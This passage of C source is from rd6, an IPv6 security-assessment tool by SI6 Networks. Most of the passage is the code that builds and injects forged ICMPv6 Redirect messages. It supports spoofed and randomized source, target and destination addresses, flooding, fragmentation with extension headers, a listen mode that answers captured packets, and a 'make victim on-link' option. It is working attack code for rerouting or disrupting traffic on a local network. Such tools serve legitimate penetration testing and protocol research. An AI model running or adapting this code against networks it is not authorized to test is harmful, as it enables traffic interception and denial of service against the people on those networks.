		targetaddr.s6_addr16[0]= htons(0xfe80); /* Link-local unicast prefix */

		for(i=1;i<8;i++)
			targetaddr.s6_addr16[i]=0x0000;
	
		targetpreflen=64;
	}

	if(!floodt_f && !targetaddr_f){
		if(!makeonlink_f){
			puts("Must specify Redirect Target Address");
			exit(EXIT_FAILURE);
		}
		else if(!floodr_f){
			targetaddr= rediraddr;
			targetaddr_f=1;
		}
	}


	/* If the "flood destination" option was set, but no prefix was specified for the
	   "redirected destination", we select random addressses (from ::/0)
	 */
	if(floodr_f && !redirprefix_f){
		for(i=0;i<8;i++)
			rediraddr.s6_addr16[i]=0x0000;
	
		redirpreflen=0;
	}

	if(!floods_f)
		nsources=1;

	if(!floodt_f)
		ntargets=1;

	if(!floodr_f)
		nredirs=1;

	if(sanityfilters_f){
		if(filters.nacceptlinkdst > MAX_ACCEPT_LINK_DST){
			puts("Too many link-layer Destination Address (accept) filters while adding sanity filters.");
			exit(EXIT_FAILURE);
		}

		if(learnrouter_f)
			filters.acceptlinkdst[filters.nacceptlinkdst]= router_ether;
		else
			filters.acceptlinkdst[filters.nacceptlinkdst]= idata.hsrcaddr;

		filters.nacceptlinkdst++;
		filters.acceptfilters_f=1;			


		if(filters.nblocksrc >= MAX_BLOCK_SRC){
			puts("Too many IPv6 Source Address (block) filters while adding sanity filters.");
			exit(EXIT_FAILURE);
		}
	    
		if ( inet_pton(AF_INET6, "fe80::", &(filters.blocksrc[filters.nblocksrc])) <= 0){
			puts("Error while adding sanity filter for link-local addresses.");
			exit(EXIT_FAILURE);
		}

		filters.blocksrclen[filters.nblocksrc] = 16;
		filters.nblocksrc++;
	}

	if(!sleep_f)
		nsleep=1;

	if( !fragh_f && dstoptuhdr_f){
		puts("Dst. Options Header (Unfragmentable Part) set, but Fragmentation not specified");
		exit(EXIT_FAILURE);
	}
    
	if(fragh_f)
		idata.max_packet_size = MAX_IPV6_PAYLOAD + MIN_IPV6_HLEN;
	else
		idata.max_packet_size = ETH_DATA_LEN;

	if(!norheader_f && !(rhtcp_f || rhudp_f || rhicmp6_f))
		rhdefault_f=1;

	if(!ip6hoplimit_f)
		ip6hoplimit=255;

	if(!ip6length_f)
		ip6length=1460;

	if(!peeraddr_f)
		peeraddr= idata.dstaddr;

	if(rhtcp_f || rhdefault_f){
		if(!tcpflags_f)
			tcpflags= tcpflags | TH_ACK;

		if(!tcpack_f)
			tcpack= random();

		if(!tcpseq_f)
			tcpseq= random();

		if(!tcpwin_f)
			tcpwin= ((u_int16_t) random() + 1500) & (u_int16_t)0x7f00;

		if(!peerport_f)
			peerport= random();

		if(!redirport_f)
			redirport= random();

		if(!tcpurg_f)
			tcpurg= 0;
	}

	if(rhudp_f){
		if(!peerport_f)
			peerport= random();

		if(!redirport_f)
			redirport= random();
	}

	if(rhicmp6_f){
		if(!icmp6id_f)
			icmp6id= random();

		if(!icmp6seq_f)
			icmp6seq= random();
	}

	if(idata.verbose_f){
		print_attack_info(&idata);
	}


	/*
	   Set filter for IPv6 packets (find_ipv6_router() set its own filter fore receiving RAs)
	 */
	if(pcap_compile(idata.pfd, &pcap_filter, PCAP_IPV6_FILTER, PCAP_OPT, PCAP_NETMASK_UNKNOWN) == -1){
		printf("pcap_compile(): %s", pcap_geterr(idata.pfd));
		exit(EXIT_FAILURE);
	}
    
	if(pcap_setfilter(idata.pfd, &pcap_filter) == -1){
		printf("pcap_setfilter(): %s", pcap_geterr(idata.pfd));
		exit(EXIT_FAILURE);
	}

	pcap_freecode(&pcap_filter);

	/* Set initial contents of the attack packet */
	init_packet_data(&idata);
    
	/* Fire an ICMPv6 Redirect if an IPv6 Destination Address was specified 	*/
	if((idata.dstaddr_f) && (targetaddr_f || floodt_f) && (rediraddr_f || floodr_f)){
		send_packet(&idata, NULL, NULL);
		if(idata.verbose_f)    
			puts("Initial attack packet(s) sent successfully.");

		if(loop_f){
			if(idata.verbose_f)
				printf("Now sending Redirect Messages every %u second%s...\n", nsleep, \
											((nsleep>1)?"s":""));
			while(loop_f){
				sleep(nsleep);
				send_packet(&idata, NULL, NULL);
			}
		}

		exit(EXIT_SUCCESS);
	}

	if(idata.listen_f){
		if(idata.verbose_f){
			print_filters(&idata, &filters);
			puts("Listening to incoming IPv6 messages...");
		}

		if( (idata.fd= pcap_fileno(idata.pfd)) == -1){
			puts("Error obtaining descriptor number for pcap_t");
			exit(EXIT_FAILURE);
		}

		FD_ZERO(&sset);
		FD_SET(idata.fd, &sset);

		while(idata.listen_f){
			rset= sset;

			if((sel=select(idata.fd+1, &rset, NULL, NULL, NULL)) == -1){
				if(errno == EINTR){
					continue;
				}
				else{
					puts("Error in select()");
					exit(EXIT_FAILURE);
				}
			}

			/* Read an IPv6 packet */
			if((r=pcap_next_ex(idata.pfd, &pkthdr, &pktdata)) == -1){
				printf("pcap_next_ex(): %s", pcap_geterr(idata.pfd));
				exit(EXIT_FAILURE);
			}
			else if(r == 0){
				continue; /* Should never happen */
			}

			pkt_ether = (struct ether_header *) pktdata;
			pkt_ipv6 = (struct ip6_hdr *)((char *) pkt_ether + ETHER_HDR_LEN);

			accepted_f=0;

			if(idata.type == DLT_EN10MB && idata.flags != IFACE_LOOPBACK){
				if(filters.nblocklinksrc){
					if(match_ether(filters.blocklinksrc, filters.nblocklinksrc, &(pkt_ether->src))){
						if(idata.verbose_f>1)
							print_filter_result(&idata, pktdata, BLOCKED);
		
						continue;
					}
				}

				if(filters.nblocklinkdst){
					if(match_ether(filters.blocklinkdst, filters.nblocklinkdst, &(pkt_ether->dst))){
						if(idata.verbose_f>1)
							print_filter_result(&idata, pktdata, BLOCKED);
		
						continue;
					}
				}
			}
	
			if(filters.nblocksrc){
				if(match_ipv6(filters.blocksrc, filters.blocksrclen, filters.nblocksrc, &(pkt_ipv6->ip6_src))){
					if(idata.verbose_f>1)
						print_filter_result(&idata, pktdata, BLOCKED);
		
					continue;
				}
			}
	
			if(filters.nblockdst){
				if(match_ipv6(filters.blockdst, filters.blockdstlen, filters.nblockdst, &(pkt_ipv6->ip6_dst))){
					if(idata.verbose_f>1)
						print_filter_result(&idata, pktdata, BLOCKED);
		
					continue;
				}
			}

			if(idata.type == DLT_EN10MB && idata.flags != IFACE_LOOPBACK){	
				if(filters.nacceptlinksrc){
					if(match_ether(filters.acceptlinksrc, filters.nacceptlinksrc, &(pkt_ether->src)))
						accepted_f=1;
				}

				if(filters.nacceptlinkdst && !accepted_f){
					if(match_ether(filters.acceptlinkdst, filters.nacceptlinkdst, &(pkt_ether->dst)))
						accepted_f= 1;
				}
			}

			if(filters.nacceptsrc && !accepted_f){
				if(match_ipv6(filters.acceptsrc, filters.acceptsrclen, filters.nacceptsrc, &(pkt_ipv6->ip6_src)))
					accepted_f= 1;
			}

			if(filters.nacceptdst && !accepted_f){
				if(match_ipv6(filters.acceptdst, filters.acceptdstlen, filters.nacceptdst, &(pkt_ipv6->ip6_dst)))
					accepted_f=1;
			}
	
			if(filters.acceptfilters_f && !accepted_f){
				if(idata.verbose_f>1)
					print_filter_result(&idata, pktdata, BLOCKED);

				continue;
			}

			if(idata.verbose_f>1)
				print_filter_result(&idata, pktdata, ACCEPTED);

			/* Send a Redirect message */
			send_packet(&idata, pktdata, pkthdr);
		}
    
		exit(EXIT_SUCCESS);
	}
    

	if(!(idata.dstaddr_f && (targetaddr_f || floodt_f) && (rediraddr_f || floodr_f)) && !idata.listen_f){
		puts("Error: Nothing to send! (key parameters left unspecified, and not using listening mode)");
		exit(EXIT_FAILURE);
	}

	exit(EXIT_SUCCESS);
}



/*
 * Function: init_packet_data()
 *
 * Initialize the contents of the attack packet (Ethernet header, IPv6 Header, and ICMPv6 header)
 * that are expected to remain constant for the specified attack.
 */
void init_packet_data(struct iface_data *idata){
	ethernet= (struct ether_header *) buffer;
	v6buffer = buffer + idata->linkhsize;
	ipv6 = (struct ip6_hdr *) v6buffer;

	if(idata->flags != IFACE_TUNNEL && idata->flags != IFACE_LOOPBACK){
		ethernet->src = idata->hsrcaddr;
		ethernet->dst = idata->hdstaddr;
		ethernet->ether_type = htons(ETHERTYPE_IPV6);
	}

	ipv6->ip6_flow=0;
	ipv6->ip6_vfc= 0x60;
	ipv6->ip6_hlim= hoplimit;
	ipv6->ip6_src= idata->srcaddr;
	ipv6->ip6_dst= idata->dstaddr;

	prev_nh = (unsigned char *) &(ipv6->ip6_nxt);

	ptr = (unsigned char *) v6buffer + MIN_IPV6_HLEN;
    
	if(hbhopthdr_f){
		hbhopthdrs=0;
	
		while(hbhopthdrs < nhbhopthdr){
			if((ptr+ hbhopthdrlen[hbhopthdrs]) > (v6buffer+ ETH_DATA_LEN)){
				puts("Packet too large while processing HBH Opt. Header");
				exit(EXIT_FAILURE);
			}
	    
			*prev_nh = IPPROTO_HOPOPTS;
			prev_nh = ptr;
			memcpy(ptr, hbhopthdr[hbhopthdrs], hbhopthdrlen[hbhopthdrs]);
			ptr = ptr + hbhopthdrlen[hbhopthdrs];
			hbhopthdrs++;
		}
	}

	if(dstoptuhdr_f){
		dstoptuhdrs=0;
	
		while(dstoptuhdrs < ndstoptuhdr){
			if((ptr+ dstoptuhdrlen[dstoptuhdrs]) > (v6buffer+ ETH_DATA_LEN)){
				puts("Packet too large while processing Dest. Opt. Header (Unfrag. Part)");
				exit(EXIT_FAILURE);
			}

			*prev_nh = IPPROTO_DSTOPTS;
			prev_nh = ptr;
			memcpy(ptr, dstoptuhdr[dstoptuhdrs], dstoptuhdrlen[dstoptuhdrs]);
			ptr = ptr + dstoptuhdrlen[dstoptuhdrs];
			dstoptuhdrs++;
		}
	}

	/* Everything that follows is the Fragmentable Part of the packet */
	fragpart = ptr;

	if(fragh_f){
		/* Check that we are able to send the Unfragmentable Part, together with a 
		   Fragment Header and a chunk data over our link layer
		 */
		if( (fragpart+sizeof(fraghdr)+nfrags) > (v6buffer+ETH_DATA_LEN)){
			puts("Unfragmentable part too large for current MTU (1500 bytes)");
			exit(EXIT_FAILURE);
		}

		/* We prepare a separete Fragment Header, but we do not include it in the packet to be sent.
		   This Fragment Header will be used (an assembled with the rest of the packet by the 
		   send_packet() function.
		*/
		bzero(&fraghdr, FRAG_HDR_SIZE);
		*prev_nh = IPPROTO_FRAGMENT;
		prev_nh = (unsigned char *) &fraghdr;
	}

	if(dstopthdr_f){
		dstopthdrs=0;
	
		while(dstopthdrs < ndstopthdr){
			if((ptr+ dstopthdrlen[dstopthdrs]) > (v6buffer + idata->max_packet_size)){
			puts("Packet too large while processing Dest. Opt. Header (should be using the Frag. option?)");
			exit(EXIT_FAILURE);
			}
    
			*prev_nh = IPPROTO_DSTOPTS;
			prev_nh = ptr;
			memcpy(ptr, dstopthdr[dstopthdrs], dstopthdrlen[dstopthdrs]);
			ptr = ptr + dstopthdrlen[dstopthdrs];
			dstopthdrs++;
		}
	}


	*prev_nh = IPPROTO_ICMPV6;

	if( (ptr+sizeof(struct nd_redirect)) > (v6buffer + idata->max_packet_size)){
		puts("Packet too large while inserting ICMPv6 Redirect header (should be using Frag. option?)");
		exit(EXIT_FAILURE);
	}

	rd= (struct nd_redirect *) ptr;

	rd->nd_rd_type = ND_REDIRECT;
	rd->nd_rd_code = 0;
	rd->nd_rd_reserved = 0;
	rd->nd_rd_target = targetaddr;
	rd->nd_rd_dst = rediraddr;
    
	ptr += sizeof(struct nd_redirect);

	if(tllaopt_f && nlinkaddr==1){
		if( (ptr+sizeof(struct nd_opt_tlla)) <= (v6buffer + idata->max_packet_size) ){
			tllaopt = (struct nd_opt_tlla *) ptr;
			tllaopt->type= ND_OPT_TARGET_LINKADDR;
			tllaopt->length= TLLA_OPT_LEN;
			bcopy(linkaddr[0].a, tllaopt->address, ETH_ALEN);
			ptr += sizeof(struct nd_opt_tlla);
		}
		else{
			puts("Packet Too Large while processing target link-layer address option");
			exit(EXIT_FAILURE);
		}
	}

	startofprefixes=ptr;
}



/*
 * Function: send_packet()
 *
 * Initialize the remaining fields of the Neighbor Advertisement Message, and
 * send the attack packet(s).
 */
void send_packet(struct iface_data *idata, const u_char *pktdata, struct pcap_pkthdr *pkthdr){
	if(pktdata != NULL){   /* Sending a Redirect in response to a received packet */
		pkt_ether = (struct ether_header *) pktdata;
		pkt_ipv6 = (struct ip6_hdr *)((char *) pkt_ether + idata->linkhsize);
		pkt_end = (unsigned char *) pktdata + pkthdr->caplen;

		/* The packet length is the minimum of what we capured, and what is specified in the
		   IPv6 Total Lenght field
		 */
		if( pkt_end > ((unsigned char *)pkt_ipv6 + sizeof(struct ip6_hdr) + pkt_ipv6->ip6_plen) )
			pkt_end = (unsigned char *)pkt_ipv6 + sizeof(struct ip6_hdr) + pkt_ipv6->ip6_plen;

		pkt_ipv6addr = &(pkt_ipv6->ip6_src);

		/*
		   We don't send any packets if the Source Address of the captured packet is the unspecified
		   address.
		 */
		if(IN6_IS_ADDR_UNSPECIFIED(pkt_ipv6addr)){
			return;
		}
		else{
			ipv6->ip6_dst = pkt_ipv6->ip6_src;
			ethernet->dst = pkt_ether->src;
		}

		pkt_ipv6addr = &(pkt_ipv6->ip6_dst);

		/*
		   We respond to packets sent to a multicast address only if the tool has been explicitly instructed
		   to do so. 
		 */
		if(IN6_IS_ADDR_MULTICAST(pkt_ipv6addr) && !respmcast_f)
			return;

		rd->nd_rd_dst = pkt_ipv6->ip6_dst;
	}

	sources=0;

	do{
		if(floods_f){
			/* 
			   Randomizing the IPv6 Source address based on the prefix specified by 
			   "srcaddr" and srcpreflen.
			 */  
			startrand= idata->srcpreflen/16;

			for(i=0; i<startrand; i++)
				ipv6->ip6_src.s6_addr16[i]= 0;

			for(i=startrand; i<8; i++)
				ipv6->ip6_src.s6_addr16[i]=random();

			if(idata->srcpreflen%16){
				mask=0xffff;
	    
				for(i=0; i<(idata->srcpreflen%16); i++)
					mask= mask>>1;

				ipv6->ip6_src.s6_addr16[startrand]= ipv6->ip6_src.s6_addr16[startrand] \
											& htons(mask);
			}

			for(i=0; i<=(idata->srcpreflen/16); i++)
				ipv6->ip6_src.s6_addr16[i]= ipv6->ip6_src.s6_addr16[i] | idata->srcaddr.s6_addr16[i];

			if(!idata->hsrcaddr_f){
				for(i=0; i<6; i++)
					ethernet->src.a[i]= random();
			}
	    
			if(tllaopt_f && !tllaopta_f){
				bcopy(ethernet->src.a, tllaopt->address, ETH_ALEN);
			}
		}

		redirs=0;

		do{
			if(floodr_f){
				/* 
				   Randomizing the Redirected Address based on the prefix specified by rediraddr 
				   and redirpreflen.
				 */  
				startrand= redirpreflen/16;

				for(i=0; i<startrand; i++)
					rd->nd_rd_dst.s6_addr16[i]= 0;

				for(i=startrand; i<8; i++)
					rd->nd_rd_dst.s6_addr16[i]=random();

				if(redirpreflen%16){
					mask=0xffff;

					for(i=0; i<(redirpreflen%16); i++)
						mask= mask>>1;

					rd->nd_rd_dst.s6_addr16[startrand]= rd->nd_rd_dst.s6_addr16[startrand] \
													& htons(mask);
				}

				for(i=0; i<=(redirpreflen/16); i++)
					rd->nd_rd_dst.s6_addr16[i]= rd->nd_rd_dst.s6_addr16[i] | \
										rediraddr.s6_addr16[i];

			}


			targets=0;

			do{
				if(floodt_f){
					/* 
					   Randomizing the Redirect Target Address based on the prefix specified 
					   by targetaddr and targetpreflen.
					 */  
					startrand= targetpreflen/16;

					for(i=0; i<startrand; i++)
						rd->nd_rd_target.s6_addr16[i]= 0;

					for(i=startrand; i<8; i++)
						rd->nd_rd_target.s6_addr16[i]=random();

					if(targetpreflen%16){
						mask=0xffff;

						for(i=0; i<(targetpreflen%16); i++)
							mask= mask>>1;

						rd->nd_rd_target.s6_addr16[startrand]= rd->nd_rd_target.s6_addr16[startrand] \
													& htons(mask);
					}

					for(i=0; i<=(targetpreflen/16); i++)
						rd->nd_rd_target.s6_addr16[i]= rd->nd_rd_target.s6_addr16[i] | \
											targetaddr.s6_addr16[i];

				}
				else if(makeonlink_f && floodr_f){
					/* The target field contains the address specified by the "-t" option. 
					   Otherwise (if we must make the address "on-link", the ND target field 
					   is set to the same value as the RD Destination Address
					 */
					rd->nd_rd_target= rd->nd_rd_dst;
				}

				/*
				 * If a single target link-layer address option is to be included, it is included
				 * by init_packet_data()
				 */
				if(nlinkaddr==1)
					linkaddrs=1;
				else
					linkaddrs=0;

				ptr=startofprefixes;

				while(linkaddrs<nlinkaddr && ((ptr+sizeof(struct nd_opt_tlla))-v6buffer) <= idata->max_packet_size){
					tllaopt = (struct nd_opt_tlla *) ptr;
					tllaopt->type= ND_OPT_TARGET_LINKADDR;
					tllaopt->length= TLLA_OPT_LEN;
					bcopy(linkaddr[linkaddrs].a, tllaopt->address, ETH_ALEN);
					ptr += sizeof(struct nd_opt_tlla);
					linkaddrs++;
					newdata_f=1;
				}

				if(linkaddrs<nlinkaddr){
					puts("Too many Target Link-ayer Address options (should be using 'frag' option?");
					exit(EXIT_FAILURE);
				}



				/*  We include a Redirected Header by default */
				if(!norheader_f){
					/*
					   The amount of data that we include in the Redirected Header depends on a number
					   of factors:
					   a) If a specific amount has been specified, we include up to that amount of
					      data (i.e., provided it is available from the captured packet)
					   b) If our packet has not yet exceeded the minimum IPv6 MTU (1280 bytes), we
					      include as many bytes as possible without exceeding that size.
					   c) If our packet already exceeds the minimum IPv6 MTU, we include at most 68
					      bytes
					 */
					if(pktdata != NULL){
						if(rhlength_f){
							rhbytes= rhlength;
						}
						else{
							currentsize= ptr - (unsigned char *)ipv6;
							if( (currentsize+sizeof(struct nd_opt_rd_hdr)) > 1280)
								rhbytes=48;
							else
								rhbytes= 1280- currentsize - sizeof(struct nd_opt_rd_hdr);
						}

						pktbytes= pkt_end - (unsigned char*) pkt_ipv6;

						if( rhbytes > pktbytes)
							rhbytes= pktbytes;

						rhbytes= (rhbytes>>3) << 3;

						if( (ptr+sizeof(struct nd_opt_rd_hdr)+rhbytes) > (v6buffer + idata->max_packet_size)){
							puts("Packet Too Large while inserting Redirected Header Option");
							exit(EXIT_FAILURE);
						}
						rh = (struct nd_opt_rd_hdr *) ptr;
						rh->nd_opt_rh_type = ND_OPT_REDIRECTED_HEADER;
						rh->nd_opt_rh_len = rhbytes/8 + 1;
						rh->nd_opt_rh_reserved1= 0;
						rh->nd_opt_rh_reserved2= 0;
						ptr+= sizeof(struct nd_opt_rd_hdr);
						bcopy(pkt_ipv6, ptr, rhbytes);
						ptr+= rhbytes;
					}
					else{
						/* The Redirect is *not* being sent in response to a received packet */

						if(rhlength_f){
							rhbytes= rhlength;
						}
						else{
							currentsize= ptr - (unsigned char *)ipv6;
							if( (currentsize+sizeof(struct nd_opt_rd_hdr)) > 1280)
								rhbytes=48;
							else
								rhbytes= 1280- currentsize - sizeof(struct nd_opt_rd_hdr);
						}

						rhbytes= (rhbytes>>3) << 3;

						if( (ptr+sizeof(struct nd_opt_rd_hdr)+rhbytes) > (v6buffer + idata->max_packet_size)){
							puts("Packet Too Large while inserting Redirected Header Option");
							exit(EXIT_FAILURE);
						}

						rh = (struct nd_opt_rd_hdr *) ptr;
						rh->nd_opt_rh_type = ND_OPT_REDIRECTED_HEADER;
						rh->nd_opt_rh_len = rhbytes/8 + 1;
						rh->nd_opt_rh_reserved1= 0;
						rh->nd_opt_rh_reserved2= 0;
						ptr+= sizeof(struct nd_opt_rd_hdr);

						rhipv6 = (struct ip6_hdr *) rhbuff;
						rhipv6->ip6_flow= 0;
						rhipv6->ip6_vfc= 0x60;
						rhipv6->ip6_plen= htons(ip6length);
						rhipv6->ip6_hlim= ip6hoplimit;
						rhipv6->ip6_src= peeraddr;
						rhipv6->ip6_dst= rd->nd_rd_dst;

						if(rhtcp_f || rhdefault_f){
							rhipv6->ip6_nxt= IPPROTO_TCP;
							rhtcp= (struct tcp_hdr *) (rhbuff + sizeof(struct ip6_hdr));
							bzero(rhtcp, sizeof(struct tcp_hdr));
							rhtcp->th_sport= htons(peerport);
							rhtcp->th_dport= htons(redirport);
							rhtcp->th_seq = htonl(tcpseq);
							rhtcp->th_ack= htonl(tcpack);
							rhtcp->th_flags= tcpflags;
							rhtcp->th_urp= htons(tcpurg);
							rhtcp->th_win= htons(tcpwin);
							rhtcp->th_off= MIN_TCP_HLEN >> 2;
							rhtcp->th_sum = random();

							if(rhbytes <= (MIN_IPV6_HLEN + MIN_TCP_HLEN)){
								bcopy(rhbuff, ptr, rhbytes);
								ptr+= rhbytes;
							}
							else{
								bcopy(rhbuff, ptr, MIN_IPV6_HLEN+MIN_TCP_HLEN);
								ptr += MIN_IPV6_HLEN+MIN_TCP_HLEN;
								rhbytes -= MIN_IPV6_HLEN+MIN_TCP_HLEN;

								while(rhbytes>=4){
									*(u_int32_t *)ptr = random();
									ptr += sizeof(u_int32_t);
									rhbytes -= sizeof(u_int32_t);
								}
							}
						}

						else if(rhudp_f){
							rhipv6->ip6_nxt= IPPROTO_UDP;
							rhudp = (struct udp_hdr *) (rhbuff + sizeof(struct ip6_hdr));
							rhudp->uh_sport= htons(peerport);
							rhudp->uh_dport= htons(redirport);
							rhudp->uh_ulen= rhipv6->ip6_plen;
							rhudp->uh_sum= random();

							if(rhbytes <= (MIN_IPV6_HLEN + MIN_UDP_HLEN)){
								bcopy(rhbuff, ptr, rhbytes);
								ptr+= rhbytes;
							}
							else{
								bcopy(rhbuff, ptr, MIN_IPV6_HLEN+MIN_UDP_HLEN);
								ptr += MIN_IPV6_HLEN+MIN_UDP_HLEN;
								rhbytes -= MIN_IPV6_HLEN+MIN_UDP_HLEN;
								while(rhbytes>=4){
									*(u_int32_t *)ptr = random();
									ptr += sizeof(u_int32_t);
									rhbytes -= sizeof(u_int32_t);
								}
							}
						}
						else if(rhicmp6_f){
							rhipv6->ip6_nxt= IPPROTO_ICMPV6;
							rhicmp6 = (struct icmp6_hdr *) (rhbuff + sizeof(struct ip6_hdr));
							rhicmp6->icmp6_type = ICMP6_ECHO_REQUEST;
							rhicmp6->icmp6_code = 0;
							rhicmp6->icmp6_cksum = random();
							rhicmp6->icmp6_data16[0]= random(); /* Identifier */
							rhicmp6->icmp6_data16[1]= random(); /* Sequence Number */

							if(rhbytes <= (MIN_IPV6_HLEN + MIN_ICMP6_HLEN)){
								bcopy(rhbuff, ptr, rhbytes);
								ptr+= rhbytes;
							}
							else{
								bcopy(rhbuff, ptr, MIN_IPV6_HLEN+MIN_ICMP6_HLEN);
								ptr += MIN_IPV6_HLEN+MIN_ICMP6_HLEN;
								rhbytes -= MIN_IPV6_HLEN+MIN_ICMP6_HLEN;
								while(rhbytes>=4){
									*(u_int32_t *)ptr = random();
									ptr += sizeof(u_int32_t);
									rhbytes -= sizeof(u_int32_t);
								}
							}
						}
					}
				}

				rd->nd_rd_cksum = 0;
				rd->nd_rd_cksum = in_chksum(v6buffer, rd, ptr-((unsigned char *)rd), IPPROTO_ICMPV6);

				if(!fragh_f){
					ipv6->ip6_plen = htons((ptr - v6buffer) - MIN_IPV6_HLEN);

					if((nw=pcap_inject(idata->pfd, buffer, ptr - buffer)) == -1){
						printf("pcap_inject(): %s\n", pcap_geterr(idata->pfd));
						exit(EXIT_FAILURE);
					}

					if(nw != (ptr-buffer)){
						printf("pcap_inject(): only wrote %lu bytes (rather than %lu bytes)\n", (LUI) nw, \
													(LUI) (ptr-buffer));
						exit(EXIT_FAILURE);
					}
				}
				else{
					ptrend= ptr;
					ptr= fragpart;
					fptr = fragbuffer;
					fipv6 = (struct ip6_hdr *) (fragbuffer + ETHER_HDR_LEN);
					fptrend = fptr + ETHER_HDR_LEN+MIN_IPV6_HLEN+MAX_IPV6_PAYLOAD;
					memcpy(fptr, buffer, fragpart-buffer);
					fptr = fptr + (fragpart-buffer);

					if( (fptr+FRAG_HDR_SIZE)> fptrend){
						puts("Unfragmentable Part is Too Large");
						exit(EXIT_FAILURE);
					}

					memcpy(fptr, (char *) &fraghdr, FRAG_HDR_SIZE);
					fh= (struct ip6_frag *) fptr;
					fh->ip6f_ident=random();
					startoffragment = fptr + FRAG_HDR_SIZE;

					/*
					 * Check that the selected fragment size is not larger than the largest 
					 * fragment size that can be sent
					 */
					if(nfrags <= (fptrend - fptr))
						fragsize=nfrags;
					else
						fragsize= (fptrend-fptr) & IP6F_OFF_MASK;

					m=IP6F_MORE_FRAG;

					while((ptr< ptrend) && m==IP6F_MORE_FRAG){
						fptr= startoffragment;

						if( (ptrend-ptr) <= fragsize){
							fragsize= ptrend-ptr;
							m=0;
						}

						memcpy(fptr, ptr, fragsize);
						fh->ip6f_offlg = (htons(ptr-fragpart) & IP6F_OFF_MASK) | m;
						ptr+=fragsize;
						fptr+=fragsize;

						fipv6->ip6_plen = htons((fptr - fragbuffer) - MIN_IPV6_HLEN - ETHER_HDR_LEN);
		
						if((nw=pcap_inject(idata->pfd, fragbuffer, fptr - fragbuffer)) == -1){
							printf("pcap_inject(): %s\n", pcap_geterr(idata->pfd));
							exit(EXIT_FAILURE);
						}

						if(nw != (fptr- fragbuffer)){
							printf("pcap_inject(): only wrote %lu bytes (rather than %lu bytes)\n", \
																(LUI) nw, (LUI) (ptr-buffer));
							exit(EXIT_FAILURE);
						}
					} /* Sending fragments */
				} /* Sending fragmented datagram */

				targets++;

			}while(targets<ntargets);

			redirs++;
		}while(redirs<nredirs);

		sources++;
	}while(sources<nsources);
}



/*
 * Function: usage()
 *
 * Prints the syntax of the rd6 tool
 */
void usage(void){
    puts("usage: rd6 -i INTERFACE [-s SRC_ADDR[/LEN]] [-d DST_ADDR] [-S LINK_SRC_ADDR] "
	 "[-D LINK-DST-ADDR] [-A HOP_LIMIT] [-y FRAG_SIZE] [-u DST_OPT_HDR_SIZE] "
	 "[-U DST_OPT_U_HDR_SIZE] [-H HBH_OPT_HDR_SIZE] [-r RD_DESTADDR/LEN] [-t RD_TARGETADDR/LEN] "
	 "[-p PAYLOAD_TYPE] [-P PAYLOAD_SIZE] [-n] [-c HOP_LIMIT] [-x SRC_ADDR] [-a SRC_PORT] "
	 "[-o DST_PORT] [-X TCP_FLAGS] [-q TCP_SEQ] [-Q TCP_ACK] [-V TCP_URP] [-w TCP_WIN] [-M] "
	 "[-O] [-N] [-E LINK_ADDR] [-e] [-j PREFIX[/LEN]] [-k PREFIX[/LEN]] [-J LINK_ADDR] [-K LINK_ADDR] "
	 "[-b PREFIX[/LEN]] [-g PREFIX[/LEN]] [-B LINK_ADDR] [-G LINK_ADDR] [-f] "
	 "[-R N_DESTS] [-T N_TARGETS] [-F N_SOURCES] [-L | -l] [-z] [-v] [-h]");
}


/*
 * Function: print_help()
 *
 * Prints help information for the rd6 tool
 */
void print_help(void){
	puts(SI6_TOOLKIT);
	puts( "rd6: Security assessment tool for attack vectors based on Redirect messages\n");
	usage();
    
	puts("\nOPTIONS:\n"
	     "  --interface, -i           Network interface\n"
	     "  --src-address, -s         IPv6 Source Address\n"
	     "  --dst-address, -d         IPv6 Destination Address\n"
	     "  --hop-limit, -A           IPv6 Hop Limit\n"
	     "  --frag-hdr. -y            Fragment Header\n"
	     "  --dst-opt-hdr, -u         Destination Options Header (Fragmentable Part)\n"
	     "  --dst-opt-u-hdr, -U       Destination Options Header (Unfragmentable Part)\n"
	     "  --hbh-opt-hdr, -H         Hop by Hop Options Header\n"
	     "  --link-src-address, -S    Link-layer Destination Address\n"
	     "  --link-dst-address, -D    Link-layer Source Address\n"
	     "  --redir-dest, -r          Redirect Destination Address\n"
	     "  --redir-target, -t        Redirect Target Address\n"
	     "  --payload-type, -p        Redirected Header Payload Type\n"
	     "  --payload-size, -P        Redirected Header Payload Size\n"
	     "  --no-payload, -n          Do not include a Redirected Header Option\n"
	     "  --ipv6-hlim, -c           Redirected Header Payload's Hop Limit\n"
	     "  --peer-addr, -x           Redirected Header Payload's IPv6 Source Address\n"
	     "  --peer-port, -a           Redirected Header Payload's Source Port\n"
	     "  --redir-port, -o          Redirected Header Payload's Destination Port\n"
	     "  --tcp-flags, -X           Redirected Header Payload's TCP Flags\n"
	     "  --tcp-seq, -q             Redirected Header Payload's TCP SEQ Number\n"
	     "  --tcp-ack, -Q             Redirected Header Payload's TCP ACK Number\n"
	     "  --tcp-urg, -V             Redirected Header Payload's TCP URG Pointer\n"
	     "  --tcp-win, -w             Redirected Header Payload's TCP Window\n"
	     "  --resp-mcast, -M          Respond to Multicast Packets\n"
	     "  --make-onlink, O          Make victim on-link\n"
	     "  --learn-router, N         Dynamically learn local router addresses\n"
	     "  --target-lla-opt, -E      Target link-layer address option\n"
	     "  --add-tlla-opt, -e        Add Target link-layer address option\n"
	     "  --block-src, -j           Block IPv6 Source Address prefix\n"
	     "  --block-dst, -k           Block IPv6 Destination Address prefix\n"
	     "  --block-link-src, -J      Block Ethernet Source Address\n"
	     "  --block-link-dst, -K      Block Ethernet Destination Address\n"
	     "  --accept-src, -b          Accept IPv6 Source Addres prefix\n"
	     "  --accept-dst, -g          Accept IPv6 Destination Address prefix\n"
	     "  --accept-link-src, -B     Accept Ethernet Source Address\n"
	     "  --accept-link-dst, -G     Accept Ethernet Destination Address\n"
	     "  --sanity-filters, -f      Add sanity filters\n"
	     "  --flood-dests, -R         Flood with multiple Redirect Destination Addresses\n"
	     "  --flood-targets, -T       Flood with multiple Redirect Target Addresses\n"
	     "  --flood-sources, -F       Flood with multiple IPv6 Source Addresses\n"
	     "  --listen, -L              Listen to incoming packets\n"
	     "  --loop, -l                Send periodic Redirect messages\n"
	     "  --sleep, -z               Pause between sending Redirect messages\n"
	     "  --help, -h                Print help for the rd6 tool\n"
	     "  --verbose, -v             Be verbose\n"
	     "\n"
	     "Programmed by Fernando Gont for SI6 Networks <http://www.si6networks.com>\n"
	     "Please send any bug reports to <fgont@si6networks.com>"
	);
}


/*
 * Function: print_attack_info()
 *
 * Prints attack details (when the verbose ("-v") option is specified).
 */
 
void print_attack_info(struct iface_data *idata){
